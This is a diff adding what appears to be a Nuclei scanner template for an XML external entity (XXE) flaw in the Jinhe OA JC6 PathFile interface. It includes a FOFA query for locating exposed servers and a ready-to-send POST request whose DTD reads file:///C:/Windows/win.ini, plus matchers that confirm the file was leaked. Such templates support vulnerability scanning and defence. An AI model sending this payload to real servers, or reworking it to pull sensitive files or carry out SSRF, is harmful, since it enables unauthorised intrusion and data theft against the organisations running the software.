@@ -1,0 +1,38 @@
+id: jinheOA-JC6-PathFile-XXE
+info:
+  name: 金和OA JC6 PathFile XXE漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
+    金和OA JC6 PathFile 接口处存在XML实体注入漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+  reference:
+    - https://mp.weixin.qq.com/s/mLICn_MtEvfHGjTam3kyXQ
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/PathFile?GetUrl HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
+        <root>
+            <path>&xxe;</path>
+            <strType>file</strType>
+            <IsVir>no</IsVir>
+            <displayType>list</displayType>
+            <strFiles>*.*</strFiles>
+        </root>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
